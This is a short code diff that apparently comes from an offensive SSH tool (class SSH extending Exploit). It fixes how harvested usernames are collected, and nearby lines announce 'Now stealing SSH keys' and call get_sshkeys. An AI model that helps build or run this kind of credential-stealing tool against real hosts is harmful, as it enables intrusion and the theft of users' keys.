@@ -49,7 +49,7 @@ class SSH(Exploit):
                 ssh.close()
             else:
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
-                users.append(self.get_usernames(ssh))
+                users.extend(self.get_usernames(ssh))
                 
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
                 self.get_sshkeys(ssh, ip_address, c[0])
